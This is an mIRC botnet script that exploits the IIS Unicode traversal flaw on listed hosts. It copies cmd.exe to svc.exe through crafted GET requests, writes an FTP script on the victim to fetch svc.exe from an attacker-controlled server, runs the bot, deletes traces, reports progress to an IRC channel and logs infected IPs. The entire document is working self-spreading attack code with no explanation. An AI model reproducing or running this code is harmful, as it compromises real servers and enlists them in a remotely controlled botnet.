@#$%^&*@#$%^&*@#$%^&*@#$%^&*#$%^&*#$%^&*#$%^&*#$%^&*@#$%^&*
alias aftp.start { 
  if ( %aftp.stat  == on ) { halt }
  if ($lines(unicod_ready) == 0) { halt }
  set %aftp.bug $read -l1 unicod_ready  |  write -dl1 unicod_ready
  sockclose scriptftp*  | sockclose b0tzz* |  sockclose delzz* 
  sockclose aftp | set %aftp.stat on |   set %ip $deltok(%aftp.bug,2-,47) |   set %ftp $remove(%aftp.bug,%ip,/c+dir+c:\)
  set %ftpcopy %ftp $+ /c+copy+c:\winnt\system32\cmd.exe+svc.exe
  set %ftp1 $deltok(%ftp,2-,47) | set %ftp2 $left(%ftp1,2)
  if (%ftp2 == ..) { set %ftp / }
  else { set %ftp / $+ %ftp1 $+ / } 
  set %ftp %ftp $+ svc.exe? |   sockopen aftp %ip 80
  .timeraftp.Tout 1 25 Aftp.Tout
}
on *:sockopen:aftp: {
  if ($sockerr > 0) {  halt }
  sockwrite -nt $sockname GET %ftpcopy
}
on *:sockread:aftp: {
  sockread -f %ftp1
  if (1 file(s) copied isin %ftp1) { 
    .timeraftp.Tout off
    .timeraftp.Tout2 1 500 aftp.Tout2
    msg %chan CMD copied: %ip $+ %ftp $+ /c+dir+c:\
    set %tfp2 0 |  ftpscript 
  }
  if (Access is denied isin %ftp1) { set %aftp.stat off | aftp.start | msg %chan Access denied }
}
alias Aftp.Tout  { sockclose aftp | set %aftp.stat off | aftp.start  }
alias aftp.Tout2 { sockclose aftp | dozz }
alias ftpscript {    inc %tfp2 1 |   sockopen scriptftp. $+ %tfp2 %ip 80  }
on *:sockopen:scriptftp*: {
  if ($sockerr > 0) { halt }
  if ( $gettok($sockname,2,46) == 1 ) timers1 1 3 sockwrite -nt $sockname GET %ftp $+ /c+echo+open+ $+ %aftp.server $+ >c:\svc.scr
  if ( $gettok($sockname,2,46) == 2 ) timers2 1 6 sockwrite -nt $sockname GET %ftp $+ /c+echo+user+ $+ %aftp.login $+ >>c:\svc.scr
  if ( $gettok($sockname,2,46) == 3 ) timers3 1 9 sockwrite -nt $sockname GET %ftp $+ /c+echo+ $+ %aftp.pass $+ >>c:\svc.scr
  if ( $gettok($sockname,2,46) == 4 ) timers4 1 12 sockwrite -nt $sockname GET %ftp $+ /c+echo+bin>>c:\svc.scr
  if ( $gettok($sockname,2,46) == 5 ) timers5 1 15 sockwrite -nt $sockname GET %ftp $+ /c+echo+get+svc.exe+c:\svc.exe>>c:\svc.scr
  if ( $gettok($sockname,2,46) == 6 ) timers6 1 18 sockwrite -nt $sockname GET %ftp $+ /c+echo+bye>>c:\svc.scr
  if ( $gettok($sockname,2,46) == 7 ) timers7 1 21 sockwrite -nt $sockname GET %ftp $+ /c+ftp+-s:c:\svc.scr+-n+-d 
  if ( $gettok($sockname,2,46) <= 7 ) {  ftpscript }
  if ( $gettok($sockname,2,46) == 8 )  { 
    msg %chan Uploading  
  }
}
on *:sockclose:scriptftp*: {
  if ( $gettok($sockname,2,46) == 8 ) {  msg %chan Runing |  .timeraftp.Tout2 off  | delzz  |  b0tl0ad  }
}
alias dozz { sockclose scriptftp* | msg %chan Uploaded  |  delzz  |  b0tl0ad  }
alias OuTLoadBot { sockclose b0tzz*  | msg %chan Bot has not runed   | set %aftp.stat off | aftp.start   }
alias b0tl0ad { sockopen b0tzz $+ $rand(0,999999) %ip 80 }
on *:sockopen:b0tzz*: { timerrun1 1 5 sockwrite -nt $sockname GET %ftp $+ /c+c:\svc.exe | timerrun2 1 25 sockwrite -nt $sockname GET %ftp $+ /c+ $+ $mircdir $+ \svchost.exe |  .timeruotloadb 1 40 OuTLoadBot    }
on *:sockclose:b0tzz*: {  .timeruotloadb off | /msg %chan Bot has been runed  | write ip.txt $sock($sockname).ip  | set %aftp.stat off | aftp.start  }
alias delzz {   sockopen delzz $+ $rand(0,999999) %ip 80 }
on *:sockopen:delzz*: {    sockwrite -nt $sockname GET %ftp $+ /c+del+c:\svc.scr    }